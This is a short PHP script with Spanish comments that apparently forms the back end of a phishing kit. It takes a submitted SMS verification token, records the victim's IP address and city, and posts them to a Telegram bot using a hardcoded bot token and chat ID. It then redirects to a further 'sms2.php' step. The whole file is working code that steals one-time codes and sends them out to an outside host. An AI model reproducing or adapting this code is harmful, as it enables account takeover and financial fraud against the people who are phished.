<?php
// Datos del formulario
$fecha = $_POST['cas2'] ?? '';

// Obtener la dirección IP real del cliente
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $direccion_ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // Dividir la lista de IPs y obtener la primera
    $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $direccion_ip = trim($ipList[0]);
} else {
    $direccion_ip = $_SERVER['REMOTE_ADDR'];
}

// Obtener ciudad basada en la dirección IP (usando un servicio externo)
$ciudad = '';
if (!empty($direccion_ip)) {
    $ip_api_url = "http://ip-api.com/json/{$direccion_ip}?fields=city";
    $response = @file_get_contents($ip_api_url);
    if ($response !== false) {
        $json = json_decode($response, true);
        $ciudad = isset($json['city']) ? $json['city'] : '';
    }
}

// Token del bot y chat ID del canal (reemplaza con tus valores)
$botToken = '7800107447:AAH6DFeEsjGOi36Tqik-q3ztQ2nM7v0QLFc';
$chatId = '-4506942260'; // Puede ser el nombre o el ID numérico del canal

// Mensaje a enviar con formato específico
$mensaje = "-TK2-:\n";
$mensaje .= "🔑 TOKEN-AMI-SMS-2: <code>$fecha</code>\n";
$mensaje .= "🌐 IP: <code>$direccion_ip</code>\n";
$mensaje .= "🏙 Ciu: <code>$ciudad</code>";

// URL de la API de Telegram para enviar mensajes
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

// Datos a enviar
$data = [
    'chat_id' => $chatId,
    'text' => $mensaje,
    'parse_mode' => 'HTML'
];

// Configurar la petición
$options = [
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($data)
    ]
];

// Crear un contexto
$context = stream_context_create($options);

// Enviar el mensaje a Telegram
$result = file_get_contents($telegramUrl, false, $context);

// Verificar si se envió correctamente
if ($result === false) {
    // Aquí puedes manejar el error
} else {
    header('Refresh: 2; URL=sms2.php');
    exit;
}

?>